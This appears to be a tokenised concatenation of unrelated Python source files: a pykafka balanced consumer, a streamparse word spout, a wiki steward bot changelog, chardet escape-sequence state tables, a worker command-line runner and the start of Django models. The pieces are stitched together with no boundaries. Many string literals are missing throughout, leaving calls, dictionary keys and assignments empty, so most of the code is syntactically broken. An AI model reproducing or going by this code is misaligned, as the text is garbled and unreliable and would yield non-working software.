return "%s/%s-%s" % ( self . _topic_path , p . leader . id , p . id ) \n 
\n 
~~ def _remove_partitions ( self , partitions ) : \n 
~~~ """Remove partitions from the zookeeper registry for this consumer.\n\n        :param partitions: The partitions to remove.\n        :type partitions: Iterable of :class:`pykafka.partition.Partition`\n        """ \n 
for p in partitions : \n 
# TODO pass zk node version to make sure we still own this node \n 
~~~ self . _zookeeper . delete ( self . _path_from_partition ( p ) ) \n 
\n 
~~ ~~ def _add_partitions ( self , partitions ) : \n 
~~~ """Add partitions to the zookeeper registry for this consumer.\n\n        :param partitions: The partitions to add.\n        :type partitions: Iterable of :class:`pykafka.partition.Partition`\n        """ \n 
for p in partitions : \n 
~~~ try : \n 
~~~ self . _zookeeper . create ( \n 
self . _path_from_partition ( p ) , \n 
value = get_bytes ( self . _consumer_id ) , \n 
ephemeral = True \n 
) \n 
~~ except NodeExistsError : \n 
~~~ raise PartitionOwnedError ( p ) \n 
\n 
~~ ~~ ~~ def _get_held_partitions ( self ) : \n 
~~~ """Build a set of partitions zookeeper says we own""" \n 
zk_partition_ids = set ( ) \n 
all_partitions = self . _zookeeper . get_children ( self . _topic_path ) \n 
for partition_slug in all_partitions : \n 
~~~ try : \n 
~~~ owner_id , stat = self . _zookeeper . get ( \n 
. format ( \n 
path = self . _topic_path , slug = partition_slug ) ) \n 
if owner_id == get_bytes ( self . _consumer_id ) : \n 
~~~ zk_partition_ids . add ( int ( partition_slug . split ( ) [ 1 ] ) ) \n 
~~ ~~ except NoNodeException : \n 
~~~ pass # disappeared between ``get_children`` and ``get`` \n 
~~ ~~ return set ( self . _topic . partitions [ _id ] for _id in zk_partition_ids ) \n 
\n 
~~ @ _catch_thread_exception \n 
def _brokers_changed ( self , brokers ) : \n 
~~~ if not self . _running : \n 
~~~ return False # `False` tells ChildrenWatch to disable this watch \n 
~~ if self . _setting_watches : \n 
~~~ return \n 
~~ log . debug ( "Rebalance triggered by broker change ({})" . format ( \n 
self . _consumer_id ) ) \n 
self . _rebalance ( ) \n 
\n 
~~ @ _catch_thread_exception \n 
def _consumers_changed ( self , consumers ) : \n 
~~~ if not self . _running : \n 
~~~ return False # `False` tells ChildrenWatch to disable this watch \n 
~~ if self . _setting_watches : \n 
~~~ return \n 
~~ log . debug ( "Rebalance triggered by consumer change ({})" . format ( \n 
self . _consumer_id ) ) \n 
self . _rebalance ( ) \n 
\n 
~~ @ _catch_thread_exception \n 
def _topics_changed ( self , topics ) : \n 
~~~ if not self . _running : \n 
~~~ return False # `False` tells ChildrenWatch to disable this watch \n 
~~ if self . _setting_watches : \n 
~~~ return \n 
~~ log . debug ( "Rebalance triggered by topic change ({})" . format ( \n 
self . _consumer_id ) ) \n 
self . _rebalance ( ) \n 
\n 
~~ def reset_offsets ( self , partition_offsets = None ) : \n 
~~~ """Reset offsets for the specified partitions\n\n        Issue an OffsetRequest for each partition and set the appropriate\n        returned offset in the consumer\'s internal offset counter.\n\n        :param partition_offsets: (`partition`, `timestamp_or_offset`) pairs to\n            reset where `partition` is the partition for which to reset the offset\n            and `timestamp_or_offset` is EITHER the timestamp of the message\n            whose offset the partition should have OR the new offset the\n            partition should have\n        :type partition_offsets: Sequence of tuples of the form\n            (:class:`pykafka.partition.Partition`, int)\n\n        NOTE: If an instance of `timestamp_or_offset` is treated by kafka as\n        an invalid offset timestamp, this function directly sets the consumer\'s\n        internal offset counter for that partition to that instance of\n        `timestamp_or_offset`. On the next fetch request, the consumer attempts\n        to fetch messages starting from that offset. See the following link\n        for more information on what kafka treats as a valid offset timestamp:\n        https://cwiki.apache.org/confluence/display/KAFKA/A+Guide+To+The+Kafka+Protocol#AGuideToTheKafkaProtocol-OffsetRequest\n        """ \n 
self . _raise_worker_exceptions ( ) \n 
if not self . _consumer : \n 
~~~ raise ConsumerStoppedException ( "Internal consumer is stopped" ) \n 
~~ self . _consumer . reset_offsets ( partition_offsets = partition_offsets ) \n 
\n 
~~ def consume ( self , block = True ) : \n 
~~~ """Get one message from the consumer\n\n        :param block: Whether to block while waiting for a message\n        :type block: bool\n        """ \n 
\n 
def consumer_timed_out ( ) : \n 
~~~ """Indicates whether the consumer has received messages recently""" \n 
if self . _consumer_timeout_ms == - 1 : \n 
~~~ return False \n 
~~ disp = ( time . time ( ) - self . _last_message_time ) * 1000.0 \n 
return disp > self . _consumer_timeout_ms \n 
~~ message = None \n 
self . _last_message_time = time . time ( ) \n 
while message is None and not consumer_timed_out ( ) : \n 
~~~ self . _raise_worker_exceptions ( ) \n 
try : \n 
~~~ message = self . _consumer . consume ( block = block ) \n 
~~ except ( ConsumerStoppedException , AttributeError ) : \n 
~~~ if not self . _running : \n 
~~~ raise ConsumerStoppedException \n 
~~ continue \n 
~~ if message : \n 
~~~ self . _last_message_time = time . time ( ) \n 
~~ if not block : \n 
~~~ return message \n 
~~ ~~ return message \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ """Yield an infinite stream of messages until the consumer times out""" \n 
while True : \n 
~~~ message = self . consume ( block = True ) \n 
if not message : \n 
~~~ raise StopIteration \n 
~~ yield message \n 
\n 
~~ ~~ def commit_offsets ( self ) : \n 
~~~ """Commit offsets for this consumer\'s partitions\n\n        Uses the offset commit/fetch API\n        """ \n 
self . _raise_worker_exceptions ( ) \n 
if not self . _consumer : \n 
~~~ raise KafkaException ( "Cannot commit offsets - consumer not started" ) \n 
~~ return self . _consumer . commit_offsets ( ) \n 
~~ ~~ __license__ = """\nCopyright 2015 Parse.ly, Inc.\n\nLicensed under the Apache License, Version 2.0 (the "License");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an "AS IS" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n""" \n 
from itertools import cycle \n 
\n 
from streamparse import Spout \n 
\n 
\n 
class WordSpout ( Spout ) : \n 
~~~ outputs = [ ] \n 
\n 
def initialize ( self , stormconf , context ) : \n 
~~~ self . words = cycle ( [ , , , ] ) \n 
\n 
~~ def next_tuple ( self ) : \n 
~~~ word = next ( self . words ) \n 
self . emit ( [ word ] ) \n 
~~ ~~ """\nPython Storm Topology DSL\n""" \n 
\n 
from . stream import Grouping , Stream \n 
from . topology import Topology \n 
"""\n2012-12-03 r23\n\t- added support for IPv6 addresses in commands (Issue #18)\n\n2011-04-01 r22\n\t- new configuration: toggle handling of !commit command;\n\t- use new API modules for getGlobalRights;\n\t- use new API modules for getGlobalDetails (merged from getGlobalAccounts and getGlobalEdits);\n\t- simplified package design.\n\n2011-03-29 r21\n\t- bugfix: Wikimedia handler assigned incorrect family for betwikiversity.\n\n2011-03-01 r20\n\t- bugfix: global edit count parsing broken in MW1.17wmf;\n\t- added command parameter trimming.\n\n2010-11-20 r19\n\t- !stabhide conflict detection algorithm revamped;\n\t- !stabhide now has \'hard\' option to hide accounts even if they have edits.\n\n2010-10-17 r18\n\t- Wikimedia.py: fixed handling of special *wikimedia wikis.\n\n2010-08-09 r17\n\t- !stabhide overrides no-local-block list.\n\n2010-08-08 r16\n\t- !stab no longer blocks on enwikibooks, per\n\t  http://lists.wikimedia.org/pipermail/foundation-l/2010-August/060447.html\n\n2010-07-13 r15\n\t- now raises ValueError when user is assigned multiple access levels in config;\n\t- overrode StrictDict iterators to never iterate over internal __name__ item.\n\n2010-06-29 r14\n\t- BREAKING CHANGE: replaced config.debug* options for straight-to-file state\n\t  dumping with new config.components.exceptionLogger. The config.debug*\n\t  lines can be safely removed from configuration files without replacement\n\t  to send exceptions to ERROR_LOG.txt in the bot directory.\n\t- abstracted string encoding, fixed encoding crash when logging non-latin\n\t  characters.\n\n2010-06-28 r13\n\t- added configurable logging/output (messages can now be sent to console, file, or nowhere);\n\t- prefer packaged modules over system modules (resolves version conflicts);\n\t- added stewbot version number.\n\n2010-05-15 r12\n\t- updated CentralAuth scraping for interface changes.\n\n2010-05-13 r11\n\t- disabled !activity for en.wikipedia.\n\n2010-04-30 r10\n\t- added randomized exit messages.\n\n2010-04-27 r9\n\t- bugfix: reblockIfChanged did nothing if reblock=false.\n\n2010-04-18 r8\n\t- bugfix: when hiding an account that is already suppressed, treat \'suppressed\' as \'hidden\'\n\t  to avoid implicitly reducing hide level.\n\n2010-04-17 r7\n\t- added !getblocks command;\n\t- show edit count in !stab* output;\n\t- added IP support in Browser::getBlockStatus(), which now returns array;\n\t- added Browser::getGlobalBlocks() & Browser::getCentralAuthStatus();\n\t- bugfix: page creations counted twice in !stab output if they\'re also top edits.\n\n2010-04-15 r6\n\t- bugfix: exception when processing queue range with multiple gaps.\n\n2010-04-11 r5\n\t- updated CentralAuth scraping for new interface;\n\t- added !globalOversight command (requires new CentralAuth interface);\n\t- removed disabled global account deletion;\n\t- moved to DefaultSettings & validated __config__ scheme;\n\t- fixed HTTP parser bug when \'<br/>\' has no space before the slash;\n\t- updated /modules/mechanize.\n\n2010-04-06 r4\n\t- updated for MediaWiki API change: https://bugzilla.wikimedia.org/show_bug.cgi?id=23076 .\n\n2010-03-29 r3\n\t- packaged irclib and simplejson into /modules/.\n\t- added SSL for IRC.\n\n2010-03-27 r2\n\t- bugfix: commands can be queued for !commit even if they\'re configured as uncommittable (issue #5).\n\n2010-03-26 r1\n\t- now open-source; initial commit.\n""" \n 
######################## BEGIN LICENSE BLOCK ######################## \n 
# The Original Code is mozilla.org code. \n 
# \n 
# The Initial Developer of the Original Code is \n 
# Netscape Communications Corporation. \n 
# Portions created by the Initial Developer are Copyright (C) 1998 \n 
# the Initial Developer. All Rights Reserved. \n 
# \n 
# Contributor(s): \n 
#   Mark Pilgrim - port to Python \n 
# \n 
# This library is free software; you can redistribute it and/or \n 
# modify it under the terms of the GNU Lesser General Public \n 
# License as published by the Free Software Foundation; either \n 
# version 2.1 of the License, or (at your option) any later version. \n 
# \n 
# This library is distributed in the hope that it will be useful, \n 
# but WITHOUT ANY WARRANTY; without even the implied warranty of \n 
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU \n 
# Lesser General Public License for more details. \n 
# \n 
# You should have received a copy of the GNU Lesser General Public \n 
# License along with this library; if not, write to the Free Software \n 
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA \n 
# 02110-1301  USA \n 
######################### END LICENSE BLOCK ######################### \n 
\n 
from . constants import eStart , eError , eItsMe \n 
\n 
HZ_cls = ( \n 
1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 00 - 07 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 08 - 0f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 10 - 17 \n 
0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , # 18 - 1f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 20 - 27 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 28 - 2f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 30 - 37 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 38 - 3f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 40 - 47 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 48 - 4f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 50 - 57 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 58 - 5f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 60 - 67 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 68 - 6f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 70 - 77 \n 
0 , 0 , 0 , 4 , 0 , 5 , 2 , 0 , # 78 - 7f \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # 80 - 87 \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # 88 - 8f \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # 90 - 97 \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # 98 - 9f \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # a0 - a7 \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # a8 - af \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # b0 - b7 \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # b8 - bf \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # c0 - c7 \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # c8 - cf \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # d0 - d7 \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # d8 - df \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # e0 - e7 \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # e8 - ef \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # f0 - f7 \n 
1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , # f8 - ff \n 
) \n 
\n 
HZ_st = ( \n 
eStart , eError , 3 , eStart , eStart , eStart , eError , eError , # 00-07 \n 
eError , eError , eError , eError , eItsMe , eItsMe , eItsMe , eItsMe , # 08-0f \n 
eItsMe , eItsMe , eError , eError , eStart , eStart , 4 , eError , # 10-17 \n 
5 , eError , 6 , eError , 5 , 5 , 4 , eError , # 18-1f \n 
4 , eError , 4 , 4 , 4 , eError , 4 , eError , # 20-27 \n 
4 , eItsMe , eStart , eStart , eStart , eStart , eStart , eStart , # 28-2f \n 
) \n 
\n 
HZCharLenTable = ( 0 , 0 , 0 , 0 , 0 , 0 ) \n 
\n 
HZSMModel = { : HZ_cls , \n 
: 6 , \n 
: HZ_st , \n 
: HZCharLenTable , \n 
: "HZ-GB-2312" } \n 
\n 
ISO2022CN_cls = ( \n 
2 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 00 - 07 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 08 - 0f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 10 - 17 \n 
0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , # 18 - 1f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 20 - 27 \n 
0 , 3 , 0 , 0 , 0 , 0 , 0 , 0 , # 28 - 2f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 30 - 37 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 38 - 3f \n 
0 , 0 , 0 , 4 , 0 , 0 , 0 , 0 , # 40 - 47 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 48 - 4f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 50 - 57 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 58 - 5f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 60 - 67 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 68 - 6f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 70 - 77 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 78 - 7f \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 80 - 87 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 88 - 8f \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 90 - 97 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 98 - 9f \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # a0 - a7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # a8 - af \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # b0 - b7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # b8 - bf \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # c0 - c7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # c8 - cf \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # d0 - d7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # d8 - df \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # e0 - e7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # e8 - ef \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # f0 - f7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # f8 - ff \n 
) \n 
\n 
ISO2022CN_st = ( \n 
eStart , 3 , eError , eStart , eStart , eStart , eStart , eStart , # 00-07 \n 
eStart , eError , eError , eError , eError , eError , eError , eError , # 08-0f \n 
eError , eError , eItsMe , eItsMe , eItsMe , eItsMe , eItsMe , eItsMe , # 10-17 \n 
eItsMe , eItsMe , eItsMe , eError , eError , eError , 4 , eError , # 18-1f \n 
eError , eError , eError , eItsMe , eError , eError , eError , eError , # 20-27 \n 
5 , 6 , eError , eError , eError , eError , eError , eError , # 28-2f \n 
eError , eError , eError , eItsMe , eError , eError , eError , eError , # 30-37 \n 
eError , eError , eError , eError , eError , eItsMe , eError , eStart , # 38-3f \n 
) \n 
\n 
ISO2022CNCharLenTable = ( 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ) \n 
\n 
ISO2022CNSMModel = { : ISO2022CN_cls , \n 
: 9 , \n 
: ISO2022CN_st , \n 
: ISO2022CNCharLenTable , \n 
: "ISO-2022-CN" } \n 
\n 
ISO2022JP_cls = ( \n 
2 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 00 - 07 \n 
0 , 0 , 0 , 0 , 0 , 0 , 2 , 2 , # 08 - 0f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 10 - 17 \n 
0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , # 18 - 1f \n 
0 , 0 , 0 , 0 , 7 , 0 , 0 , 0 , # 20 - 27 \n 
3 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 28 - 2f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 30 - 37 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 38 - 3f \n 
6 , 0 , 4 , 0 , 8 , 0 , 0 , 0 , # 40 - 47 \n 
0 , 9 , 5 , 0 , 0 , 0 , 0 , 0 , # 48 - 4f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 50 - 57 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 58 - 5f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 60 - 67 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 68 - 6f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 70 - 77 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 78 - 7f \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 80 - 87 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 88 - 8f \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 90 - 97 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 98 - 9f \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # a0 - a7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # a8 - af \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # b0 - b7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # b8 - bf \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # c0 - c7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # c8 - cf \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # d0 - d7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # d8 - df \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # e0 - e7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # e8 - ef \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # f0 - f7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # f8 - ff \n 
) \n 
\n 
ISO2022JP_st = ( \n 
eStart , 3 , eError , eStart , eStart , eStart , eStart , eStart , # 00-07 \n 
eStart , eStart , eError , eError , eError , eError , eError , eError , # 08-0f \n 
eError , eError , eError , eError , eItsMe , eItsMe , eItsMe , eItsMe , # 10-17 \n 
eItsMe , eItsMe , eItsMe , eItsMe , eItsMe , eItsMe , eError , eError , # 18-1f \n 
eError , 5 , eError , eError , eError , 4 , eError , eError , # 20-27 \n 
eError , eError , eError , 6 , eItsMe , eError , eItsMe , eError , # 28-2f \n 
eError , eError , eError , eError , eError , eError , eItsMe , eItsMe , # 30-37 \n 
eError , eError , eError , eItsMe , eError , eError , eError , eError , # 38-3f \n 
eError , eError , eError , eError , eItsMe , eError , eStart , eStart , # 40-47 \n 
) \n 
\n 
ISO2022JPCharLenTable = ( 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ) \n 
\n 
ISO2022JPSMModel = { : ISO2022JP_cls , \n 
: 10 , \n 
: ISO2022JP_st , \n 
: ISO2022JPCharLenTable , \n 
: "ISO-2022-JP" } \n 
\n 
ISO2022KR_cls = ( \n 
2 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 00 - 07 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 08 - 0f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 10 - 17 \n 
0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , # 18 - 1f \n 
0 , 0 , 0 , 0 , 3 , 0 , 0 , 0 , # 20 - 27 \n 
0 , 4 , 0 , 0 , 0 , 0 , 0 , 0 , # 28 - 2f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 30 - 37 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 38 - 3f \n 
0 , 0 , 0 , 5 , 0 , 0 , 0 , 0 , # 40 - 47 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 48 - 4f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 50 - 57 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 58 - 5f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 60 - 67 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 68 - 6f \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 70 - 77 \n 
0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , # 78 - 7f \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 80 - 87 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 88 - 8f \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 90 - 97 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # 98 - 9f \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # a0 - a7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # a8 - af \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # b0 - b7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # b8 - bf \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # c0 - c7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # c8 - cf \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # d0 - d7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # d8 - df \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # e0 - e7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # e8 - ef \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # f0 - f7 \n 
2 , 2 , 2 , 2 , 2 , 2 , 2 , 2 , # f8 - ff \n 
) \n 
\n 
ISO2022KR_st = ( \n 
eStart , 3 , eError , eStart , eStart , eStart , eError , eError , # 00-07 \n 
eError , eError , eError , eError , eItsMe , eItsMe , eItsMe , eItsMe , # 08-0f \n 
eItsMe , eItsMe , eError , eError , eError , 4 , eError , eError , # 10-17 \n 
eError , eError , eError , eError , 5 , eError , eError , eError , # 18-1f \n 
eError , eError , eError , eItsMe , eStart , eStart , eStart , eStart , # 20-27 \n 
) \n 
\n 
ISO2022KRCharLenTable = ( 0 , 0 , 0 , 0 , 0 , 0 ) \n 
\n 
ISO2022KRSMModel = { : ISO2022KR_cls , \n 
: 6 , \n 
: ISO2022KR_st , \n 
: ISO2022KRCharLenTable , \n 
: "ISO-2022-KR" } \n 
\n 
# flake8: noqa \n 
"""\nThis should probably be rewritten at some point. It\'s not taking good\nadvantage of argparse.\n""" \n 
\n 
import argparse \n 
import sys \n 
import time \n 
import inspect \n 
import logging \n 
import signal \n 
import sys \n 
from multiprocessing import Process \n 
\n 
import tasa \n 
from tasa . worker import BaseWorker \n 
\n 
\n 
logger = logging . getLogger ( __name__ ) \n 
logging . basicConfig ( level = logging . INFO ) \n 
\n 
\n 
def signal_handler ( signal , frame ) : \n 
~~~ sys . exit ( 0 ) \n 
\n 
\n 
~~ def _get_argparser ( ) : \n 
~~~ parser = argparse . ArgumentParser ( ) \n 
parser . add_argument ( \n 
, , action = , \n 
version = % ( \n 
tasa . __version__ , sys . version ) ) \n 
# add common argparser arguments here \n 
return parser \n 
\n 
\n 
~~ def run ( ) : \n 
~~~ sys . path . insert ( 0 , ) \n 
parser = _get_argparser ( ) \n 
parser . description = \n 
parser . add_argument ( , \n 
type = lambda w : w . partition ( ) [ : : 2 ] , \n 
help = \n 
\'"path.to.my.module:MyWorkerClass". Relative to \' \n 
) \n 
args = parser . parse_args ( ) \n 
\n 
worker_class_name = args . worker [ 1 ] or \n 
worker_module = __import__ ( args . worker [ 0 ] , globals ( ) , locals ( ) , \n 
[ worker_class_name ] ) \n 
try : \n 
~~~ WorkerClass = getattr ( worker_module , worker_class_name ) \n 
~~ except AttributeError : \n 
~~~ print "No matching workers found.\\n" \n 
potential_workers = inspect . getmembers ( \n 
worker_module , \n 
lambda x : type ( x ) == type and issubclass ( x , BaseWorker ) ) \n 
if potential_workers : \n 
~~~ print "Found potential workers:" \n 
for name , value in potential_workers : \n 
~~~ print . join ( [ args . worker [ 0 ] , name ] ) \n 
~~ ~~ exit ( 1 ) \n 
~~ worker = WorkerClass ( ) \n 
print % ( args . worker [ 0 ] , \n 
worker . __class__ . __name__ ) \n 
try : \n 
~~~ for job in worker : \n 
~~~ if job : \n 
~~~ logger . info ( "Doing job: %s:%s" , \n 
worker . __class__ . __name__ , \n 
str ( job ) [ : 50 ] ) \n 
~~ else : \n 
# FIXME: do something better here \n 
~~~ time . sleep ( .3 ) \n 
~~ ~~ ~~ except KeyboardInterrupt : \n 
~~~ print \n 
\n 
\n 
~~ ~~ def runm ( ) : \n 
~~~ """ This is super minimal and pretty hacky, but it counts as a first pass.\n    """ \n 
signal . signal ( signal . SIGINT , signal_handler ) \n 
count = int ( sys . argv . pop ( 1 ) ) \n 
processes = [ Process ( target = run , args = ( ) ) for x in range ( count ) ] \n 
try : \n 
~~~ for p in processes : \n 
~~~ p . start ( ) \n 
~~ ~~ except KeyError : \n 
# Not sure why we see a keyerror here. Weird. \n 
~~~ pass \n 
~~ finally : \n 
~~~ for p in processes : \n 
~~~ p . join ( ) \n 
\n 
\n 
~~ ~~ ~~ def log ( ) : \n 
~~~ parser = _get_argparser ( ) \n 
parser . description = \n 
args = parser . parse_args ( ) \n 
raise NotImplemented ( ) \n 
\n 
\n 
~~ if __name__ == : \n 
# deal with being run directly rather than as an installed script \n 
~~~ cmd = if len ( sys . argv ) < 2 else sys . argv . pop ( 1 ) \n 
if cmd == : \n 
~~~ run ( ) \n 
~~ elif cmd == : \n 
~~~ log ( ) \n 
~~ else : \n 
~~~ print "First argument must be \'run\' or \'log\'" \n 
~~ ~~ from datetime import date , timedelta \n 
import uuid \n 
\n 
import phonenumbers \n 
\n 
from django . conf import settings \n 
from django . db import models \n 
from django . core . validators import RegexValidator \n 
from django . utils import timezone \n 
from django . utils . translation import ugettext as _ \n 
\n 
from . behaviors import TimeStampedModel \n 
from . import helpers , managers \n 
\n 
\n 
class Tag ( models . Model ) : \n 
~~~ """Associated with application for search and categorization.""" \n 
\n 
color_regex = RegexValidator ( regex = , message = "Color must be entered in the 6 character hex format." \n 
name = models . CharField ( max_length = 64 , unique = True , help_text = ) \n 
color = models . CharField ( max_length = 6 , validators = [ color_regex ] , help_text = \n 
description = models . CharField ( max_length = 64 , blank = True , help_text = \n 
class Meta : \n 
~~~ ordering = [ ] \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . name \n 
\n 
~~ def save ( self , * args , ** kwargs ) : \n 
~~~ self . color = self . color . lower ( ) # Convert color to lowercase \n 
super ( Tag , self ) . save ( * args , ** kwargs ) \n 
\n 
\n 
~~ ~~ class Person ( models . Model ) : \n 
~~~ """Information about a person.""" \n 
\n 
phone_regex = RegexValidator ( regex = , message = "Phone number must be entered in the format: \'+999999999\'. Up to 15 digits allowed." \n 
DEVELOPER_ROLE = \n 
QUALITY_ASSURANCE_ROLE = \n 
OPERATIONS_ROLE = \n 
MANAGER_ROLE = \n 
